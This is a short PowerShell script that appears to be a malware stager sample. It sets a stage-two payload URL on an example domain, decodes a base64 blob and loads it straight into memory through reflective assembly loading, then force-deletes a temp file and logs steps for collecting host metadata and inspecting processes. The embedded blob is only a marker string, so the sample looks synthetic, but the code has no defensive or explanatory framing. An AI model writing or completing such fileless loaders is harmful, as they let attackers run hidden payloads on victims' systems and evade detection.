$Stage2Url = 'https://adatum.com/payload.bin'
$ErrorActionPreference = "Stop"

$AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpjdzdkNHYwbHhu")
Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
$OperationResult = [Reflection.Assembly]::Load($AssemblyBytes)
if ($null -ne $OperationResult) {
    Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Write-Verbose "Stage handoff finished"
Write-Verbose "Validating result"
Write-Verbose "Collecting host metadata"
Write-Verbose "Inspecting process list"
